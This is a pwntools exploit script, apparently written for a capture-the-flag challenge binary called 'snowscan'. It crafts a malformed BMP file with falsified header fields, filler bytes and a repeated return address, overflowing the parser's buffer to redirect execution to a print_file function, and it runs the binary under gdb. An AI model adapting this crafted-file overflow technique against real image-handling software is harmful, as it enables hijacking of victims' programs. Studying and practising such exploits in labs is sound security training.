#!/usr/bin/python3
from pwn import *
import requests
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

print_file="b01f400000000000"
bmp = b'BM' # signature
bmp += p32(625) #fileSize
bmp += p32(0) # reserved
bmp += p32(54) # dataOffset
bmp += p32(0) # headerSize
bmp += p32(20)*2 # width/height
bmp += p16(0)*2 # colorPlanes/bitsPerPixel
bmp += p32(0) # compression
bmp += p32(400) # imageSize
bmp += p32(0)*4
# 54 bytes
print("payload len: ",end='')
print(len(bmp))
print(bmp)
print(len(bytearray.fromhex(print_file)))
input()


bmp += b"A"*(400)
bmp += b"B"*240
bmp += b'\xb0\x1f\x40\x00\x00\x00\x00\x00'*37

with open('./flag.txt.bmp', 'wb') as f:
    f.write(bmp)

p=process(['./snowscan','./flag.txt.bmp'])
gdb.attach(p)
p.interactive()
